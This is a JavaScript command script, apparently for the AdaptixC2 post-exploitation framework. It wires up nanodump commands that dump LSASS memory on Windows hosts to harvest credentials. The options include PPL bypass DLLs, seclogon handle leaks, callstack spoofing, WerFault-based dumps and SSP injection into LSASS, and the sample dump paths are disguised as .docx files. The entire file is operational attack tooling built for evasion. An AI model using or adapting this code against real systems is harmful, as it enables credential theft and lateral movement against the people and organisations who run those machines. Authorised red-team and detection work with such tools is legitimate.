var cmd_nanodump = ax.create_command("nanodump", "Use syscalls to dump LSASS", "nanodump -d -w C:\\Windows\\Temp\\report.docx");
cmd_nanodump.addArgFlagString( "-w", "DUMP_PATH",         false, "Filename of the dump");
cmd_nanodump.addArgBool(       "--valid",                        "Create a dump with a valid signature");
cmd_nanodump.addArgBool(       "-d",                             "Duplicate: a high privileged existing LSASS handle");
cmd_nanodump.addArgBool(       "-de",                            "Duplicate-elevate: a low privileged existing LSASS handle and then elevate it");
// cmd_nanodump.addArgBool(       "-sll",                           "Seclogon-leak-local: leak an LSASS handle into nanodump via seclogon");
cmd_nanodump.addArgFlagString( "-slr", "SLR_BIN_PATH",    false, "Seclogon-leak-remote: leak an LSASS handle into another process via seclogon and duplicate it");
cmd_nanodump.addArgBool(       "-sd",                            "Seclogon-duplicate: make seclogon open a handle to LSASS and duplicate it");
cmd_nanodump.addArgBool(       "-sc",                            "Spoof-callstack: open a handle to LSASS using a fake calling stack");
cmd_nanodump.addArgFlagString( "-spe", "SPE_DUMP_FOLDER", false, "Silent-process-exit: force WerFault.exe to dump LSASS via SilentProcessExit");
cmd_nanodump.addArgBool(       "-sk",                            "Force WerFault.exe to dump LSASS via Shtinkering (Need SYSTEM)");
cmd_nanodump.addArgBool(       "--fork",                         "Fork the target process before dumping");
cmd_nanodump.addArgBool(       "--snapshot",                     "Snapshot the target process before dumping");
cmd_nanodump.addArgBool(       "-eh",                            "Elevate-handle: open a handle to LSASS with low privileges and duplicate it to gain higher privileges");
cmd_nanodump.addArgBool(       "--getpid",                       "Print the PID of LSASS and leave");
cmd_nanodump.addArgFlagInt(    "--pid", "PID",            false, "PID of LSASS");

cmd_nanodump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }

    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }

    let silent_process_exit = "";
    let use_silent_process_exit = 0;
    let seclogon_leak_remote_binary = "";
    let use_seclogon_leak_local = 0;
    let use_seclogon_leak_remote = 0;
    let use_seclogon_duplicate = 0;
    let get_pid = 0;
    let pid = 0;
    let dump_path = ax.agent_info(id, "computer") + "_" + ax.ticks() + ".dmp";
    let write_file = 0;
    let fork = 0;
    let snapshot = 0;
    let dup = 0;
    let use_valid_sig = 0;
    let spoof_callstack = 0;
    let use_lsass_shtinkering = 0;
    let elevate_handle = 0;
    let duplicate_elevate = 0;
    let chunk_size = 0xe1000;

    if(parsed_json["--getpid"]) { get_pid = 1; }
    if(parsed_json["--valid"]) { use_valid_sig = 1; }
    if(parsed_json["--fork"]) { fork = 1; }
    if(parsed_json["--snapshot"]) { snapshot = 1; }
    if(parsed_json["-d"]) { dup = 1; }
    if(parsed_json["-eh"]) { elevate_handle = 1; }
    if(parsed_json["-de"]) { duplicate_elevate = 1; }
    if(parsed_json["-sll"]) { use_seclogon_leak_local = 1; }
    if(parsed_json["-sk"]) { use_lsass_shtinkering = 1; }
    if(parsed_json["-sd"]) { use_seclogon_duplicate = 1; }
    if(parsed_json["-sc"]) { spoof_callstack = 1; }

    if("PID" in parsed_json) {
        pid = parsed_json["PID"];
    }
    if("SPE_DUMP_FOLDER" in parsed_json) {
        silent_process_exit = parsed_json["SPE_DUMP_FOLDER"];
        use_silent_process_exit = 1;
    }
    if("SLR_BIN_PATH" in parsed_json) {
        seclogon_leak_remote_binary = parsed_json["SLR_BIN_PATH"];
        use_seclogon_leak_remote = 1;
    }
    if("DUMP_PATH" in parsed_json) {
        dump_path = parsed_json["DUMP_PATH"];
        write_file = 1;
    }

    if( get_pid &&
        (write_file || use_valid_sig || snapshot || fork || elevate_handle || duplicate_elevate || use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local || use_seclogon_leak_remote || dup || use_silent_process_exit || use_lsass_shtinkering)
    ) { throw new Error("The parameter --getpid is used alone"); }

    if (use_silent_process_exit &&
        (write_file || use_valid_sig || snapshot || fork || elevate_handle || duplicate_elevate || use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local || use_seclogon_leak_remote || dup || use_lsass_shtinkering)
    ) { throw new Error("The parameter -spe is used alone"); }

    if( dup && elevate_handle ) { throw new Error("The options -d and -eh cannot be used together"); }
    if( duplicate_elevate && spoof_callstack ) { throw new Error("The options -de and -sc cannot be used together"); }
    if( dup && spoof_callstack ) { throw new Error("The options -d and -sc cannot be used together"); }
    if( dup && use_seclogon_duplicate ) { throw new Error("The options -d and -sd cannot be used together"); }
    if( elevate_handle && duplicate_elevate ) { throw new Error("The options -eh and -de cannot be used together"); }
    if( duplicate_elevate && dup ) { throw new Error("The options -de and -d cannot be used together"); }
    if( duplicate_elevate && use_seclogon_duplicate ) { throw new Error("The options -de and -sd cannot be used together"); }
    if( elevate_handle && use_seclogon_duplicate ) { throw new Error("The options -eh and -sd cannot be used together"); }
    if( dup && use_seclogon_leak_local ) { throw new Error("The options -d and -sll cannot be used together"); }
    if( elevate_handle && use_seclogon_leak_local ) { throw new Error("The options -eh and -sll cannot be used together"); }
    if( dup && use_seclogon_leak_remote ) { throw new Error("The options -d and -slr cannot be used together"); }
    if( duplicate_elevate && use_seclogon_leak_remote ) { throw new Error("The options -de and -slr cannot be used together"); }
    if( elevate_handle && use_seclogon_leak_remote ) { throw new Error("The options --eh and -slr cannot be used together"); }
    if( use_seclogon_leak_local && use_seclogon_leak_remote ) { throw new Error("The options -sll and -slr cannot be used together"); }
    if( use_seclogon_leak_local && use_seclogon_duplicate ) { throw new Error("The options -sll and -sd cannot be used together"); }
    if( use_seclogon_leak_local && spoof_callstack ) { throw new Error("The options -sll and -sc cannot be used together"); }
    if (use_seclogon_leak_remote && use_seclogon_duplicate) { throw new Error("The options -slr and -sd cannot be used together"); }
    if (use_seclogon_leak_remote && spoof_callstack) { throw new Error("The options -slr and -sc cannot be used together"); }
    if (use_seclogon_duplicate && spoof_callstack) { throw new Error("The options -sd and -sc cannot be used together"); }
    if (!use_lsass_shtinkering && use_seclogon_leak_local && !write_file) { throw new Error("If -sll is being used, you need to provide the dump path with -w"); }
    if (!use_lsass_shtinkering && use_seclogon_leak_local && !(/^[A-Za-z]:\\.*/.test(dump_path)) ) { throw new Error("If -sll is being used, you need to provide the full path: " + dump_path); }
    if (use_lsass_shtinkering && fork) { throw new Error("The options -sk and --fork cannot be used together"); }
    if (use_lsass_shtinkering && snapshot) { throw new Error("The options -sk and -ss cannot be used together"); }
    if (use_lsass_shtinkering && use_valid_sig) { throw new Error("The options -sk and --valid cannot be used together"); }
    if (use_lsass_shtinkering && write_file) { throw new Error("The options -sk and -w cannot be used together"); }

    // if($use_seclogon_leak_local)
    // {
    //     $folder = "C:\\Windows\\Temp";
    //     $seclogon_leak_remote_binary = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
    //     blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $seclogon_leak_remote_binary);
    //     $handle = openf(script_resource("_bin/nanodump." . $barch . ".exe"));
    //     $exe = readb($handle, -1);
    //     closef($handle);
    //     if(strlen($exe) == 0)
    //     {
    //         berror($1, "could not read exe file");
    //         return;
    //     }
    //     bupload_raw($1, $seclogon_leak_remote_binary, $exe);
    // }

    let bof_path = ax.script_dir() + "_bin/nanodump." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("int,cstr,int,int,int,int,int,int,int,int,int,int,int,cstr,int,int,int,cstr,int", [pid, dump_path, write_file, chunk_size, use_valid_sig, fork, snapshot, dup, elevate_handle, duplicate_elevate, get_pid, use_seclogon_leak_local, use_seclogon_leak_remote, seclogon_leak_remote_binary, use_seclogon_duplicate, spoof_callstack, use_silent_process_exit, silent_process_exit, use_lsass_shtinkering ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running NanoDump BOF");
});





var cmd_nanodump_ppl_dump = ax.create_command("nanodump_ppl_dump", "Bypass PPL and dump LSASS", "nanodump_ppl_dump -d -w C:\\Windows\\Temp\\report.docx");
cmd_nanodump_ppl_dump.addArgFlagString( "-w", "DUMP_PATH", true, "Filename of the dump");
cmd_nanodump_ppl_dump.addArgBool(       "--valid",               "Create a dump with a valid signature");
cmd_nanodump_ppl_dump.addArgBool(       "-d",                    "Duplicate: a high privileged existing LSASS handle");

cmd_nanodump_ppl_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }

    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }

    let dll_path = ax.script_dir() + "_bin/nanodump_ppl_dump." + ax.arch(id) + ".dll";
    let dll = ax.file_read(dll_path);
    if(dll.length == 0) {
        throw new Error(`file ${dll_path} not readed`);
    }

    let dup = 0;
    let use_valid_sig = 0;
    let dump_path = parsed_json["DUMP_PATH"];

    if(parsed_json["--valid"]) { use_valid_sig = 1; }
    if(parsed_json["-d"]) { dup = 1; }

    if ( !(/^[A-Za-z]:\\.*/.test(dump_path)) ) { throw new Error("You need to provide the full path: " + dump_path); }

    let bof_path = ax.script_dir() + "_bin/nanodump_ppl_dump." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("cstr,int,int,bytes", [dump_path, use_valid_sig, dup, dll]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running NanoDumpPPLDump BOF");
});





var cmd_nanodump_ppl_medic = ax.create_command("nanodump_ppl_medic", "Bypass PPL and dump LSASS", "nanodump_ppl_dump -eh -w C:\\Windows\\Temp\\report.docx");
cmd_nanodump_ppl_medic.addArgFlagString( "-w", "DUMP_PATH", true, "Filename of the dump");
cmd_nanodump_ppl_medic.addArgBool(       "--valid",               "Create a dump with a valid signature");
cmd_nanodump_ppl_medic.addArgBool(       "-eh",                   "Elevate-handle: open a handle to LSASS with low privileges and duplicate it to gain higher privileges");

cmd_nanodump_ppl_medic.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }

    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }

    let dll_path = ax.script_dir() + "_bin/nanodump_ppl_medic." + ax.arch(id) + ".dll";
    let dll = ax.file_read(dll_path);
    if(dll.length == 0) {
        throw new Error(`file ${dll_path} not readed`);
    }

    let elevate_handle = 0;
    let use_valid_sig = 0;
    let dump_path = parsed_json["DUMP_PATH"];

    if(parsed_json["--valid"]) { use_valid_sig = 1; }
    if(parsed_json["-eh"]) { elevate_handle = 1; }

    if ( !(/^[A-Za-z]:\\.*/.test(dump_path)) ) { throw new Error("You need to provide the full path: " + dump_path); }

    let bof_path = ax.script_dir() + "_bin/nanodump_ppl_medic." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("bytes,cstr,int,int", [dll, dump_path, use_valid_sig, elevate_handle]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running NanoDumpPPLMedic BOF");
});





var cmd_nanodump_ssp = ax.create_command("nanodump_ssp", "Load a Security Support Provider (SSP) into LSASS", "nanodump_ssp --write C:\\Windows\\Temp\\doc.docx");
cmd_nanodump_ssp.addArgFlagString( "-w", "DUMP_PATH",          true,  "Filename of the dump");
cmd_nanodump_ssp.addArgBool(       "--valid",                         "Create a dump with a valid signature");
cmd_nanodump_ssp.addArgFlagString( "--write-dll", "WRITE_DLL", false, "Path where to write the SSP DLL from nanodump (randomly generated if not defined)");
cmd_nanodump_ssp.addArgFlagString( "--load-dll",  "LOAD_DLL",  false, "Load an existing SSP DLL");

cmd_nanodump_ssp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }

    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }

    let use_valid_sig = 0;
    let write_dll_path = "";
    let load_dll_path = "";
    let dll = "";

    let dump_path = parsed_json["DUMP_PATH"];
    if ( !(/^[A-Za-z]:\\.*/.test(dump_path)) ) { throw new Error("You need to provide the full path: " + dump_path); }

    if(parsed_json["--valid"]) { use_valid_sig = 1; }
    if("WRITE_DLL" in parsed_json) { write_dll_path = parsed_json["WRITE_DLL"]; }
    if("LOAD_DLL" in parsed_json) { load_dll_path = parsed_json["LOAD_DLL"]; }

    if( load_dll_path.length && write_dll_path.length ) { throw new Error("The options --write-dll and --load-dll cannot be used together"); }
    if( load_dll_path.length && !(/^[A-Za-z]:\\.*/.test(load_dll_path)) ) { throw new Error("You need to provide the full path: " + load_dll_path); }

    if( write_dll_path.length ) {
        let dll_path = ax.script_dir() + "_bin/nanodump_ssp." + ax.arch(id) + ".dll";
        dll = ax.file_read(dll_path);
        if(dll.length == 0) {
            throw new Error(`file ${dll_path} not readed`);
        }
    }

    let bof_path = ax.script_dir() + "_bin/nanodump_ssp." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("bytes,cstr,cstr,cstr,int", [dll, write_dll_path, load_dll_path, dump_path, use_valid_sig]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running nanodump_ssp BOF");
});